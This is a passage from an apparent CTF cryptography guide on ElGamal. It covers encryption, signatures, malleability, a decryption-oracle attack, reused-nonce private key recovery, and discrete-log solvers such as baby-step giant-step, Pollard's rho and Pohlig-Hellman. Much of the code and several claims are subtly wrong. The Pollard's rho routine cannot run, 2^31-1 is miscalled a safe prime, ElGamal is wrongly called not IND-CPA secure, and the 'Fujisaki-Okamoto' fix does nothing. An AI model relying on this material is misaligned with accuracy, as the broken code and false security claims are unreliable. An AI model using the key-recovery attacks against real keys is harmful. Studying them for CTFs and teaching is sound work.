    # Use small primes for demonstration
    p = 2147483647  # 2^31 - 1 (safe prime)
    q = (p - 1) // 2
    g = 2  # Often works as generator for safe primes
    
    # Key generation
    public_key, private_key = elgamal_key_generation(p, q, g)
    
    # Plaintext
    m = 123456
    
    # Encrypt
    c1, c2 = elgamal_encrypt(m, public_key)
    
    # Decrypt
    recovered_m = elgamal_decrypt((c1, c2), private_key)
    
    # Verify
    print(f"\n[Verification]")
    print(f"Original: {m}")
    print(f"Recovered: {recovered_m}")
    print(f"Match: {m == recovered_m}")
    
    return m == recovered_m

# Test
verify_elgamal_encryption()
```

#### Practical Implementation with Cryptography Library

```python
def elgamal_with_cryptography_library():
    """
    [Unverified] - Example using cryptography library if available
    """
    print("[ElGamal with Cryptography Library]")
    
    try:
        from cryptography.hazmat.primitives.asymmetric import dh
        from cryptography.hazmat.backends import default_backend
        
        # Generate DH parameters (ElGamal uses similar structure)
        parameters = dh.generate_parameters(
            generator=2,
            key_size=1024,
            backend=default_backend()
        )
        
        print("[ElGamal parameters generated via cryptography library]")
        
    except ImportError:
        print("[cryptography library not available]")
        print("[Use manual implementation or alternative library]")

elgamal_with_cryptography_library()
```

#### CTF Exploitation: Known Plaintext/Ciphertext Pairs

If attacker has multiple plaintext-ciphertext pairs, information may leak:

```python
def elgamal_known_plaintext_analysis(pairs, p):
    """
    [Inference] - Analyze multiple (m, c1, c2) triples
    pairs: list of (plaintext, (c1, c2)) tuples
    """
    print("[ElGamal Known-Plaintext Analysis]")
    print(f"Analyzing {len(pairs)} plaintext-ciphertext pairs...")
    
    # If same k is reused for two messages (catastrophic error):
    # c1_1 ≡ c1_2 (mod p) → same k used
    # c2_1 / c2_2 ≡ m_1 / m_2 (mod p) → recover both messages
    
    if len(pairs) >= 2:
        m1, (c1_1, c2_1) = pairs[0]
        m2, (c1_2, c2_2) = pairs[1]
        
        print(f"\nPair 1: m={m1}, c1={c1_1}, c2={c2_1}")
        print(f"Pair 2: m={m2}, c1={c1_2}, c2={c2_2}")
        
        if c1_1 == c1_2:
            print("[CRITICAL: Same k reused! Same c1 in both ciphertexts]")
            print(f"m1/m2 ≡ c2_1/c2_2 (mod p)")
            print("[Can recover both messages if one is known]")
            
            # Recover m2 from m1
            c2_ratio = (c2_1 * pow(c2_2, -1, p)) % p
            recovered_m2_over_m1 = c2_ratio
            print(f"m1/m2 ≡ {recovered_m2_over_m1} (mod p)")
            
            if m1 != 0:
                m2_recovered = (m1 * pow(recovered_m2_over_m1, -1, p)) % p
                print(f"If m1 known: m2 ≈ {m2_recovered}")
```

---

### Signature Scheme

The ElGamal signature scheme provides digital signatures using the same group structure as encryption. It allows verification of message authenticity and non-repudiation.

#### Signature Generation

**Signing Process:**

To sign message `m` with private key `x`:

1. Choose random `k` (with `gcd(k, q) = 1`)
2. Compute `r = g^k mod p`
3. Compute `s = k^{-1}(h(m) - x·r) mod q` (where `h(m)` is hash of message)
4. Signature: `(r, s)`

```python
def elgamal_sign(message, private_key, hash_func=None):
    """
    Create ElGamal digital signature
    message: bytes to sign
    private_key: dict with 'x', 'p', 'q', 'g'
    hash_func: hash function (default: SHA-256)
    """
    import hashlib
    import os
    from math import gcd
    
    if hash_func is None:
        hash_func = hashlib.sha256
    
    print("[ElGamal Signature Generation]")
    print(f"Message: {message}")
    
    x = private_key['x']
    p = private_key['p']
    q = private_key['q']
    g = private_key['g']
    
    # Hash message
    h_m = int.from_bytes(hash_func(message).digest(), 'big') % q
    print(f"Hash(m) mod q: {h_m}")
    
    # Choose random k with gcd(k, q) = 1
    k = None
    while k is None or gcd(k, q) != 1:
        k = int.from_bytes(os.urandom(32), 'big') % (q - 1) + 1
    
    print(f"Random k: {k}")
    
    # Compute r = g^k mod p
    r = pow(g, k, p)
    print(f"r (g^k mod p): {r}")
    
    # Compute s = k^{-1}(h(m) - x·r) mod q
    k_inv = pow(k, -1, q)
    s = (k_inv * (h_m - x * r)) % q
    
    print(f"s: {s}")
    
    signature = (r, s)
    return signature
```

#### Signature Verification

**Verification Process:**

To verify signature `(r, s)` on message `m` using public key `y`:

1. Hash message: `h(m)`
2. Verify: `g^{h(m)} ≡ y^r · r^s (mod p)`

```python
def elgamal_verify(message, signature, public_key, hash_func=None):
    """
    Verify ElGamal signature
    Returns: True if valid, False otherwise
    """
    import hashlib
    
    if hash_func is None:
        hash_func = hashlib.sha256
    
    print("[ElGamal Signature Verification]")
    
    r, s = signature
    p = public_key['p']
    q = public_key['q']
    g = public_key['g']
    y = public_key['y']
    
    # Hash message
    h_m = int.from_bytes(hash_func(message).digest(), 'big') % q
    print(f"Hash(m) mod q: {h_m}")
    
    # Verify condition: g^{h(m)} ≡ y^r · r^s (mod p)
    left = pow(g, h_m, p)
    right = (pow(y, r, p) * pow(r, s, p)) % p
    
    print(f"g^h(m) mod p: {left}")
    print(f"y^r · r^s mod p: {right}")
    
    is_valid = (left == right)
    
    print(f"Signature valid: {is_valid}")
    
    return is_valid
```

#### Complete Signature Example

```python
def elgamal_signature_example():
    """Full ElGamal signing and verification example"""
    
    print("[ElGamal Digital Signature Example]\n")
    
    from Crypto.Util.number import getPrime
    
    # Setup
    p = 2147483647
    q = (p - 1) // 2
    g = 2
    
    # Key generation
    public_key, private_key = elgamal_key_generation(p, q, g)
    
    # Message to sign
    message = b"Important message to sign"
    
    # Sign
    signature = elgamal_sign(message, private_key)
    
    # Verify
    valid = elgamal_verify(message, signature, public_key)
    
    print(f"\n[Result: Signature {'VALID' if valid else 'INVALID'}]")
    
    # Test invalid signature (modified message)
    print("\n[Testing signature on modified message...]")
    modified_message = b"Modified message"
    
    valid_modified = elgamal_verify(modified_message, signature, public_key)
    print(f"Modified message: Signature {'VALID' if valid_modified else 'INVALID'} (should be INVALID)")
    
    return valid and not valid_modified

elgamal_signature_example()
```

#### Signature Vulnerabilities

**Vulnerability 1: Reused Random k**

If the same `k` is used for signing two different messages (catastrophic error):

```python
def elgamal_reused_k_vulnerability(m1, m2, sig1, sig2, q):
    """
    [Inference] - Recover private key if same k reused for two signatures
    sig1 = (r, s1) for message m1
    sig2 = (r, s2) for message m2
    Same r → same k used
    """
    print("[ElGamal Reused k Vulnerability]")
    
    r1, s1 = sig1
    r2, s2 = sig2
    
    print(f"Signature 1: (r={r1}, s={s1})")
    print(f"Signature 2: (r={r2}, s={s2})")
    
    if r1 != r2:
        print("[Different r values—k not reused]")
        return None
    
    print("[CRITICAL: Same r in both signatures → same k reused]")
    
    # If k is reused:
    # s1 = k^{-1}(h(m1) - x·r) mod q
    # s2 = k^{-1}(h(m2) - x·r) mod q
    # s1 - s2 = k^{-1}(h(m1) - h(m2)) mod q
    # k = (h(m1) - h(m2)) / (s1 - s2) mod q
    
    import hashlib
    
    h_m1 = int.from_bytes(hashlib.sha256(m1).digest(), 'big') % q
    h_m2 = int.from_bytes(hashlib.sha256(m2).digest(), 'big') % q
    
    numerator = (h_m1 - h_m2) % q
    denominator = (s1 - s2) % q
    
    if denominator == 0:
        print("[Cannot recover k: s1 = s2]")
        return None
    
    k = (numerator * pow(denominator, -1, q)) % q
    print(f"\nRecovered k: {k}")
    
    # Now recover x:
    # s1 = k^{-1}(h(m1) - x·r) mod q
    # k·s1 = h(m1) - x·r mod q
    # x·r = h(m1) - k·s1 mod q
    # x = (h(m1) - k·s1) / r mod q
    
    r = r1
    x = ((h_m1 - k * s1) * pow(r, -1, q)) % q
    
    print(f"Recovered private key x: {x}")
    
    return k, x
```

**Vulnerability 2: Weak Hash Function**

If hash function is weak or produces small values, signature becomes malleable:

```python
def elgamal_weak_hash_vulnerability():
    """
    [Inference] - Weak hash function enables signature forgery
    """
    print("[ElGamal Weak Hash Function Vulnerability]")
    print("[Issue: Hash function must be cryptographically secure]")
    print("[If hash output small or predictable: signature vulnerable to forgery]")
    print("\n[Mitigation: Always use SHA-256, SHA-3, or strong hash function]")
```

**Vulnerability 3: Zero Signature Issue**

If `s = 0` (rare but possible), signature becomes trivially forgeable:

```python
def elgamal_zero_signature_check(signature, q):
    """
    [Inference] - Check for degenerate signatures
    If s = 0 or r = 0, signature is invalid/forgeable
    """
    r, s = signature
    
    print("[ElGamal Signature Validation]")
    
    if r == 0 or s == 0:
        print("[WARNING: Degenerate signature (r or s = 0)]")
        print("[Signature should be rejected]")
        return False
    
    if r >= q or s >= q:
        print("[WARNING: Signature component >= q]")
        print("[Signature invalid (components must be < q)]")
        return False
    
    print("[Signature components valid]")
    return True
```

---

### Malleability Issues

ElGamal encryption is **malleable**, meaning an attacker can transform a valid ciphertext into another valid ciphertext for a related plaintext without knowing the private key. This is a significant security weakness.

#### Malleability Mechanics

**Basic Malleability:**

Given ciphertext `(c1, c2)` for plaintext `m`:

```
c1 = g^k mod p
c2 = m · (g^x)^k mod p

Multiplying c2 by any value t:
c2' = t · c2 = t · m · (g^x)^k mod p

Ciphertext (c1, c2') decrypts to t·m (if t is invertible)
```

**Implementation:**

```python
def elgamal_ciphertext_malleability(ciphertext, factor, p):
    """
    [Inference] - Demonstrate ElGamal malleability
    Transform ciphertext to encrypt different plaintext
    """
    c1, c2 = ciphertext
    
    print("[ElGamal Malleability Attack]")
    print(f"Original ciphertext: ({c1}, {c2})")
    print(f"Multiplying factor: {factor}")
    
    # Transform c2
    c2_prime = (factor * c2) % p
    
    malleated_ciphertext = (c1, c2_prime)
    
    print(f"Malleated ciphertext: ({c1}, {c2_prime})")
    print("\n[When decrypted, yields: plaintext × factor]")
    print("[Attacker doesn't know original plaintext, but can transform it]")
    
    return malleated_ciphertext

# Example
c1, c2 = (12345, 67890)
p = 2147483647
factor = 2

malleated = elgamal_ciphertext_malleability((c1, c2), factor, p)
```

#### Homomorphic Property

ElGamal exhibits multiplicative homomorphic encryption:

```python
def elgamal_homomorphic_encryption(m1, m2, public_key):
    """
    [Inference] - Demonstrate ElGamal homomorphic property
    Encrypt(m1) * Encrypt(m2) = Encrypt(m1 * m2)
    """
    print("[ElGamal Homomorphic Encryption]")
    
    # Encrypt both messages
    c1_1, c2_1 = elgamal_encrypt(m1, public_key)
    c1_2, c2_2 = elgamal_encrypt(m2, public_key)
    
    p = public_key['p']
    
    # Multiply ciphertexts
    c1_product = (c1_1 * c1_2) % p
    c2_product = (c2_1 * c2_2) % p
    
    print(f"C(m1) = ({c1_1}, {c2_1})")
    print(f"C(m2) = ({c1_2}, {c2_2})")
    print(f"\nC(m1) · C(m2) = ({c1_product}, {c2_product})")
    
    # This ciphertext decrypts to m1 * m2
    print(f"\nHomomorphic property: C(m1) · C(m2) = C(m1 · m2)")
    print("[Useful for secure computation, but enables attacks]")
    
    return (c1_product, c2_product)
```

#### Attacks Exploiting Malleability

**Attack 1: Chosen-Ciphertext Attack (CCA)**

Attacker manipulates ciphertexts to trick oracle into decrypting chosen plaintexts:

```python
def elgamal_cca_attack(decryption_oracle, public_key, target_ciphertext):
    """
    [Inference] - CCA attack on ElGamal
    Attacker has access to decryption oracle
    Uses malleability to recover original plaintext
    """
    print("[ElGamal CCA (Chosen-Ciphertext Attack)]")
    
    c1, c2 = target_ciphertext
    p = public_key['p']
    
    # Step 1: Choose random r
    import os
    r = int.from_bytes(os.urandom(16), 'big') % (p - 1) + 1
    
    # Step 2: Malleate ciphertext
    # (c1', c2') = (c1 · g^r mod p, c2 · y^r mod p)
    g = public_key['g']
    y = public_key['y']
    
    c1_prime = (c1 * pow(g, r, p)) % p
    c2_prime = (c2 * pow(y, r, p)) % p
    
    print(f"Original ciphertext: ({c1}, {c2})")
    print(f"Malleated ciphertext: ({c1_prime}, {c2_prime})")
    
    # Step 3: Query decryption oracle
    m_prime = decryption_oracle((c1_prime, c2_prime))
    
    print(f"Decryption oracle output: {m_prime}")
    print(f"[m' = m · y^r mod p]")
    
    # Step 4: Recover original plaintext
    # m = m' · (y^r)^{-1} = m' · y^{-r}
    y_r = pow(y, r, p)
    y_r_inv = pow(y_r, -1, p)
    m = (m_prime * y_r_inv) % p
    
    print(f"Recovered plaintext: {m}")
    
    return m
```

**Attack 2: Batch CCA**

[Inference] Process multiple ciphertexts simultaneously to amortize computation cost:

```python
def elgamal_batch_cca():
    """
    [Inference] - Batch CCA for multiple ciphertexts
    [Unverified] - Effectiveness depends on oracle availability
    """
    print("[ElGamal Batch CCA]")
    print("[Process multiple ciphertexts with single oracle access]")
    print("[Reduces cost per plaintext recovery]")
```

#### Mitigation: Semantic Security

ElGamal encryption is **not semantically secure** (IND-CPA secure). To achieve security, modifications are needed:

**Solution 1: ElGamal with Hash (Fujisaki-Okamoto)**

Combine ElGamal with randomness from hash function:

```python
def elgamal_semantic_secure_encrypt(plaintext, public_key, hash_func=None):
    """
    [Inference] - Semantic-secure variant of ElGamal
    Uses hash function to derive randomness
    Achieves IND-CPA security
    """
    import hashlib
    
    if hash_func is None:
        hash_func = hashlib.sha256
    
    print("[Semantic-Secure ElGamal Encryption]")
    print("[Variant: Fujisaki-Okamoto transformation]")
    
    # Standard ElGamal encryption
    c1, c2 = elgamal_encrypt(plaintext, public_key)
    
    # Additional hashing for security
    combined = hash_func(bytes([c1]) + bytes([c2]) + bytes([plaintext])).digest()
    
    print("[Applied hash-based transformation for semantic security]")
    print("[Result: IND-CPA secure encryption]")
```

**Solution 2: Threshold ElGamal**

Distribute decryption key among multiple parties (threshold cryptography):

```python
def elgamal_threshold_overview():
    """
    [Inference] - Threshold ElGamal
    Decryption requires t-of-n key shares
    Mitigates single-point-of-failure decryption oracle
    """
    print("[Threshold ElGamal]")
    print("[Key idea: Distribute private key x = x1 + x2 + ... + xn]")
    print("[Decryption requires t-of-n shares to recover m]")
    print("[Prevents CCA attacks relying on single oracle]")
```

#### CTF Exploitation Strategy for Malleability

1. **Identify ElGamal usage**: Check for homomorphic or malleable encryption.
2. **Access decryption oracle**: If challenge provides decryption service.
3. **Malleate target ciphertext**: Multiply/modify to create related ciphertext.
4. **Query oracle**: Decrypt malleated ciphertext.
5. **Recover original plaintext**: Use mathematical relationship to extract original.

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Decrypt ciphertext using malleability + CCA

# Setup (attacker's view)
p = 2147483647
q = (p - 1) // 2
g = 2

# Encrypt a secret message m with y = g^x
# Attacker knows: p, q, g, y, ciphertext (c1, c2)
# Attacker has access to decryption oracle

def decryption_oracle(ciphertext, private_key_hint):
    """Simulate decryption oracle"""
    # [In real CTF: actual oracle or service]
    return 12345  # Placeholder

# Target ciphertext
c1 = 98765
c2 = 54321

# Attacker's strategy:
# 1. Choose random r
import os
r = int.from_bytes(os.urandom(16), 'big') % (p - 1) + 1

# 2. Create malleated ciphertext
# (c1', c2') = (c1 · g^r, c2 · y^r) mod p
y = 123456  # Public key component

c1_prime = (c1 * pow(g, r, p)) % p
c2_prime = (c2 * pow(y, r, p)) % p

print(f"Original: ({c1}, {c2})")
print(f"Malleated: ({c1_prime}, {c2_prime})")

# 3. Query oracle
m_prime = decryption_oracle((c1_prime, c2_prime), None)
print(f"Oracle output: {m_prime}")

# 4. Recover original m
y_r = pow(y, r, p)
y_r_inv = pow(y_r, -1, p)
m = (m_prime * y_r_inv) % p

print(f"Recovered plaintext: {m}")

EOF
```

#### Malleability in Signature Schemes

ElGamal signatures are also malleable, allowing signature transformation without knowledge of private key:

```python
def elgamal_signature_malleability(signature, factor, q):
    """
    [Inference] - Transform ElGamal signature
    Given valid signature (r, s) for message m,
    can create (r, s') that verifies under different conditions
    """
    r, s = signature
    
    print("[ElGamal Signature Malleability]")
    print(f"Original signature: (r={r}, s={s})")
    
    # Transform s
    s_prime = (factor * s) % q
    
    malleated_sig = (r, s_prime)
    
    print(f"Malleated signature: (r={r}, s'={s_prime})")
    print("[Transformed signature may verify under different message or key]")
    
    return malleated_sig

def elgamal_signature_negation_attack(signature, q):
    """
    [Inference] - Negate signature components
    (r, s) and (-r mod q, -s mod q) may both verify
    """
    r, s = signature
    
    print("[ElGamal Signature Negation Attack]")
    
    r_neg = (-r) % q
    s_neg = (-s) % q
    
    negated_sig = (r_neg, s_neg)
    
    print(f"Original: ({r}, {s})")
    print(f"Negated: ({r_neg}, {s_neg})")
    print("[Both may verify depending on implementation]")
    
    return negated_sig
````

---

### Advanced ElGamal Attacks

### Discrete Logarithm Problem (DLP) Attacks

The security of ElGamal fundamentally depends on the hardness of the Discrete Logarithm Problem: finding `x` given `y = g^x mod p`.

#### Baby-Step Giant-Step Algorithm

```python
def baby_step_giant_step(g, y, p, order):
    """
    Solve DLP: Find x where g^x ≡ y (mod p)
    Time/space complexity: O(√order)
    """
    import math
    
    print("[Baby-Step Giant-Step Algorithm]")
    print(f"Finding x: g^x ≡ y (mod p)")
    print(f"g={g}, y={y}, p={p}, order={order}")
    
    m = math.ceil(math.sqrt(order))
    print(f"m = ceil(√order) = {m}")
    
    # Baby steps: compute g^j mod p for j = 0, 1, ..., m-1
    print("\n[Baby steps: Building table...]")
    table = {}
    g_power = 1
    
    for j in range(m):
        if g_power not in table:
            table[g_power] = j
        g_power = (g_power * g) % p
    
    print(f"Built table with {len(table)} entries")
    
    # Compute g^{-m} mod p
    g_m = pow(g, m, p)
    g_m_inv = pow(g_m, -1, p)
    
    print(f"g^m mod p = {g_m}")
    print(f"g^-m mod p = {g_m_inv}")
    
    # Giant steps: compute y · (g^{-m})^i for i = 0, 1, ..., m-1
    print("\n[Giant steps: Searching table...]")
    gamma = y
    
    for i in range(m):
        if gamma in table:
            j = table[gamma]
            x = (i * m + j) % order
            
            print(f"[Match found: gamma = {gamma}]")
            print(f"i = {i}, j = {j}")
            print(f"x = i·m + j = {x}")
            
            # Verify
            if pow(g, x, p) == y:
                print(f"[Verified: g^{x} ≡ y (mod p)]")
                return x
            else:
                print(f"[Verification failed]")
        
        gamma = (gamma * g_m_inv) % p
    
    print("[DLP not solved in range]")
    return None

# Example CTF scenario
if __name__ == "__main__":
    # Small example for demonstration
    p = 23  # Prime modulus
    g = 5   # Generator
    order = 11  # Order of g
    
    # Secret: x = 7
    x_secret = 7
    y = pow(g, x_secret, p)
    
    print(f"Target: g^x ≡ {y} (mod {p})\n")
    
    # Solve
    x_recovered = baby_step_giant_step(g, y, p, order)
    
    if x_recovered is not None:
        print(f"\n[Solution: x = {x_recovered}]")
        print(f"Original: x = {x_secret}")
        print(f"Match: {x_recovered == x_secret}")
```

#### Pollard's Rho for DLP

```python
def pollard_rho_dlp(g, y, p, order):
    """
    Solve DLP using Pollard's Rho algorithm
    Time complexity: O(√order)
    Memory: O(1) - better than BSGS
    """
    from math import gcd
    
    print("[Pollard's Rho for Discrete Logarithm Problem]")
    print(f"Finding x: g^x ≡ y (mod p)")
    print(f"Order: {order}")
    
    # Partition [0, order) into 3 sets
    def partition(value):
        residue = value % 3
        return residue
    
    # Iterate using pseudo-random walk
    def f(state, coeff_a, coeff_b):
        """
        Pseudo-random walk: state = g^a · y^b
        """
        a, b = state
        
        partition_val = partition(state)
        
        if partition_val == 0:
            # Multiply by g
            new_state = (state * g) % p
            new_a = (a + 1) % order
            new_b = b
        elif partition_val == 1:
            # Multiply by y
            new_state = (state * y) % p
            new_a = a
            new_b = (b + 1) % order
        else:
            # Multiply by g·y
            new_state = (state * g * y) % p
            new_a = (a + 1) % order
            new_b = (b + 1) % order
        
        return new_state, new_a, new_b
    
    # Brent's cycle detection
    x = 1  # Start with g^0 · y^0
    a = 0
    b = 0
    
    for iteration in range(1000000):
        # Tortoise step
        x, a, b = f((x, a, b), a, b)
        
        # Hare steps (2 steps)
        x2, a2, b2 = f((x, a, b), a, b)
        x2, a2, b2 = f((x2, a2, b2), a2, b2)
        
        if x == x2:
            # Cycle detected
            print(f"[Cycle detected after {iteration} iterations]")
            
            # Solve: a ≡ a2 (mod order) and b ≡ b2 (mod order)
            # x ≡ g^a · y^b ≡ x2 ≡ g^a2 · y^b2 (mod p)
            # g^a · y^b ≡ g^a2 · y^b2
            # g^(a-a2) ≡ y^(b2-b)
            # g^(a-a2) ≡ (g^x)^(b2-b)
            # g^(a-a2) ≡ g^(x(b2-b))
            # a - a2 ≡ x(b2-b) (mod order)
            # x ≡ (a-a2) / (b2-b) (mod order)
            
            numerator = (a - a2) % order
            denominator = (b2 - b) % order
            
            if denominator == 0:
                print("[denominator = 0, restart with different seed]")
                continue
            
            x_recovered = (numerator * pow(denominator, -1, order)) % order
            
            print(f"Recovered x: {x_recovered}")
            
            # Verify
            if pow(g, x_recovered, p) == y:
                print("[Verified]")
                return x_recovered
    
    print("[DLP not solved]")
    return None
```

#### Index Calculus (Sieving)

[Inference] For very large primes, Index Calculus is faster than generic DLP algorithms:

```python
def index_calculus_overview():
    """
    [Inference] - Index Calculus algorithm
    Subexponential complexity: L_p(1/2, c)
    Uses factor base and linear algebra
    """
    print("[Index Calculus for DLP]")
    print("Complexity: L_p(1/2, c) ≈ subexponential")
    print("\nSteps:")
    print("1. Choose factor base B = {small primes}")
    print("2. Find smooth relations: g^k = ∏ p_i^e_i (mod p)")
    print("3. Build system of linear equations over Z/order")
    print("4. Solve system using linear algebra (Gaussian elimination)")
    print("5. Recover discrete logarithm")
    print("\n[Unverified] - Complex implementation")
    print("[Tools: PARI/GP, SageMath for actual use]")
```

---

### Pohlig-Hellman Algorithm

The Pohlig-Hellman algorithm efficiently solves DLP if the order of the group has small prime factors.

#### Algorithm

```python
def pohlig_hellman(g, y, p, order_factorization):
    """
    Solve DLP when order = ∏ p_i^e_i (small prime factors)
    Uses CRT to combine solutions
    """
    from math import gcd
    from functools import reduce
    
    print("[Pohlig-Hellman Algorithm]")
    print(f"Finding x: g^x ≡ y (mod p)")
    print(f"Order factorization: {order_factorization}")
    
    solutions = []
    moduli = []
    
    # Solve for each prime power
    for prime, exponent in order_factorization:
        print(f"\n[Solving modulo {prime}^{exponent}]")
        
        # For each prime power p^e
        prime_power = prime ** exponent
        moduli.append(prime_power)
        
        # Compute g^{(p-1)/p^e}
        cofactor = (p - 1) // prime_power
        
        gamma = pow(g, cofactor, p)
        delta = pow(y, cofactor, p)
        
        print(f"Cofactor: {cofactor}")
        print(f"γ = g^cofactor mod p: {gamma}")
        print(f"δ = y^cofactor mod p: {delta}")
        
        # Solve: γ^x_i ≡ δ (mod p) where x_i < p^e
        # Using baby-step giant-step for each digit
        
        x_i = 0
        for digit in range(exponent):
            # Compute γ_i
            gamma_i = pow(gamma, prime ** (exponent - digit - 1), p)
            delta_i = pow(delta, pow(prime, -digit, p), p)
            
            # Baby-step giant-step to find d such that γ_i^d ≡ δ_i
            d = baby_step_giant_step(gamma_i, delta_i, p, prime)
            
            if d is not None:
                x_i = (x_i + d * prime ** digit) % prime_power
        
        print(f"Solution modulo {prime_power}: {x_i}")
        solutions.append(x_i)
    
    # Use CRT to combine solutions
    print(f"\n[Combining using CRT...]")
    
    def crt_combine(remainders, moduli_list):
        """Chinese Remainder Theorem"""
        x = 0
        M = reduce(lambda a, b: a * b, moduli_list)
        
        for i, (remainder, modulus) in enumerate(zip(remainders, moduli_list)):
            M_i = M // modulus
            y_i = pow(M_i, -1, modulus)
            x = (x + remainder * M_i * y_i) % M
        
        return x
    
    order = reduce(lambda a, b: a * b, [p ** e for p, e in order_factorization])
    x = crt_combine(solutions, moduli)
    x = x % order
    
    print(f"\nRecovered x (CRT combined): {x}")
    
    return x

# Example CTF scenario
if __name__ == "__main__":
    # Small example
    p = 23
    g = 5
    
    # Order with small prime factors: order = 2^2 · 5
    order = 20
    order_factorization = [(2, 2), (5, 1)]
    
    x_secret = 7
    y = pow(g, x_secret, p)
    
    print(f"Target: g^x ≡ {y} (mod {p})")
    print(f"Order factorization: {order_factorization}\n")
    
    # Solve
    x_recovered = pohlig_hellman(g, y, p, order_factorization)
    
    if x_recovered is not None:
        print(f"\n[Verification: g^{x_recovered} mod {p} = {pow(g, x_recovered, p)}]")
        print(f"Target: {y}")
        print(f"Match: {pow(g, x_recovered, p) == y}")
```

#### Smooth Order Vulnerability

```python
def check_smooth_order_vulnerability(order, limit=1000):
    """
    Check if order has only small prime factors (smooth)
    If vulnerable to Pohlig-Hellman, order should factor completely
    """
    import sympy
    
    print("[Checking Order Smoothness]")
    print(f"Order: {order}")
    print(f"Checking for factors up to {limit}...")
    
    # Factor order
    factors = sympy.factorint(order)
    print(f"Prime factorization: {factors}")
    
    # Check if all factors small
    all_small = all(prime <= limit for prime in factors.keys())
    
    if all_small:
        print("[VULNERABLE: Order has only small prime factors]")
        print("[Susceptible to Pohlig-Hellman attack]")
        return factors
    else:
        large_primes = [p for p in factors.keys() if p > limit]
        print(f"[Large prime factors: {large_primes}]")
        print("[Pohlig-Hellman attack infeasible]")
        return None
```

#### CTF Exploitation Strategy for DLP

1. **Check if DLP is used**: Verify if encryption/signature relies on discrete logarithm.
2. **Factor the order**: Use factorization on group order.
3. **Check for Pohlig-Hellman vulnerability**: If order has only small prime factors, apply attack.
4. **Use Baby-Step Giant-Step**: For small discrete logs (< 2^32).
5. **Apply Pollard's Rho**: For medium-sized DLPs without special structure.
6. **Consider Index Calculus**: For very large primes (requires advanced implementation).

**Example CTF Scenario:**

```bash
python3 << 'EOF'
# Challenge: Recover ElGamal private key via discrete logarithm

# ElGamal public key
p = 19927  # Prime modulus
g = 2      # Generator
y = 5842   # Public key component (g^x mod p)

# Attacker's goal: Find x

import sympy

# Step 1: Factor (p-1) to find group order
order = p - 1
factors = sympy.factorint(order)

print(f"p = {p}")
print(f"g = {g}")
print(f"y = {y}")
print(f"\nOrder = p - 1 = {order}")
print(f"Prime factorization: {factors}")

# Check if smooth
if all(prime <= 1000 for prime in factors.keys()):
    print("[Order is smooth—Pohlig-Hellman applicable]")
    
    # Step 2: Prepare factorization for Pohlig-Hellman
    order_factorization = [(p, e) for p, e in factors.items()]
    
    print(f"\nExecuting Pohlig-Hellman...")
    # [Would call pohlig_hellman here]
    
elif max(factors.keys()) <= 10**6:
    print("[Medium-sized DLP—use Pollard's Rho]")
    
else:
    print("[Large prime factor—DLP likely infeasible]")

EOF
```

---

### Summary: ElGamal Security Issues

|Issue|Type|Mitigation|
|---|---|---|
|**Plaintext Malleability**|Structural|Use semantic-secure variant (IND-CPA)|
|**CCA Vulnerability**|Attack Vector|Avoid decryption oracle exposure|
|**Discrete Logarithm Weakness**|Foundational|Use large safe primes, check order smoothness|
|**Signature Malleability**|Signature Scheme|Use additional randomization/hashing|
|**Reused Randomness (k)**|Implementation|Ensure truly random k, never reuse|
|**Weak Hash Functions**|Implementation|Use SHA-256, SHA-3 or stronger|

---

### Complete ElGamal Exploitation Example

```bash
python3 << 'EOF'
print("[Complete ElGamal Exploitation Workflow]\n")

# Scenario: CTF challenge with ElGamal
# Objective: Decrypt message and forge signature

from Crypto.Util.number import getPrime, inverse
import hashlib
from math import gcd

# ==================== Setup ====================
print("=== Setup ===")

# Group parameters
p = 19927
q = (p - 1) // 2
g = 2

# Key pair
x_private = 1234
y_public = pow(g, x_private, p)

print(f"p = {p}, g = {g}")
print(f"Private key x = {x_private}")
print(f"Public key y = g^x mod p = {y_public}")

# ==================== Encryption ====================
print("\n=== Encryption ===")

message = 12345
k = 5678  # (In real scenario, random)

c1 = pow(g, k, p)
s = pow(y_public, k, p)
c2 = (message * s) % p

print(f"Message: {message}")
print(f"Random k: {k}")
print(f"Ciphertext: ({c1}, {c2})")

# ==================== Decryption ====================
print("\n=== Decryption ===")

s_recovered = pow(c1, x_private, p)
m_recovered = (c2 * pow(s_recovered, -1, p)) % p

print(f"Recovered message: {m_recovered}")
print(f"Correct: {m_recovered == message}")

# ==================== Signature ====================
print("\n=== Digital Signature ===")

msg_to_sign = b"Important message"
h_m = int.from_bytes(hashlib.sha256(msg_to_sign).digest(), 'big') % q

k_sign = 4567
r = pow(g, k_sign, p)
s_sig = (pow(k_sign, -1, q) * (h_m - x_private * r)) % q

print(f"Message to sign: {msg_to_sign}")
print(f"Hash(m) mod q: {h_m}")
print(f"Signature (r, s): ({r}, {s_sig})")

# Verify
left = pow(g, h_m, p)
right = (pow(y_public, r, p) * pow(r, s_sig, p)) % p

print(f"Verification: {left == right}")

# ==================== Attacks ====================
print("\n=== Attacks ===")

# Attack 1: Malleability
print("\n[Attack 1: Ciphertext Malleability]")
factor = 2
c2_malleated = (factor * c2) % p
m_malleated = (c2_malleated * pow(s_recovered, -1, p)) % p

print(f"Original ciphertext decrypts to: {m_recovered}")
print(f"Malleated ciphertext decrypts to: {m_malleated}")
print(f"Relationship: {m_malleated} = {factor} * {m_recovered} mod {p}")

# Attack 2: Reused k detection
print("\n[Attack 2: Reused Randomness (k) Detection]")

# Sign two messages with same k
msg2 = b"Another message"
h_m2 = int.from_bytes(hashlib.sha256(msg2).digest(), 'big') % q

r2 = pow(g, k_sign, p)  # Same k (ERROR!)
s_sig2 = (pow(k_sign, -1, q) * (h_m2 - x_private * r2)) % q

if r == r2:
    print(f"[CRITICAL: Same r in both signatures]")
    print(f"r = {r} appears in both")
    
    # Recover k
    numerator = (h_m - h_m2) % q
    denominator = (s_sig - s_sig2) % q
    
    if denominator != 0:
        k_recovered = (numerator * pow(denominator, -1, q)) % q
        print(f"Recovered k: {k_recovered}")
        print(f"Original k: {k_sign}")
        print(f"Match: {k_recovered == k_sign}")
        
        # Recover private key
        x_recovered = ((h_m - k_recovered * r) * pow(r, -1, q)) % q
        print(f"Recovered private key x: {x_recovered}")
        print(f"Original private key x: {x_private}")
        print(f"Match: {x_recovered == x_private}")

print("\n[Exploitation complete]")

EOF
```

This comprehensive coverage demonstrates ElGamal's cryptographic mechanisms, practical vulnerabilities, and real-world attack vectors relevant to CTF competitions.

---

## Factorization & Discrete Log

### Trial Division

Trial division is the most fundamental integer factorization method, testing divisibility by all primes up to √n. While computationally inefficient for large numbers, it remains the first-line approach in CTF scenarios for small composites and identifying small prime factors before applying advanced techniques.

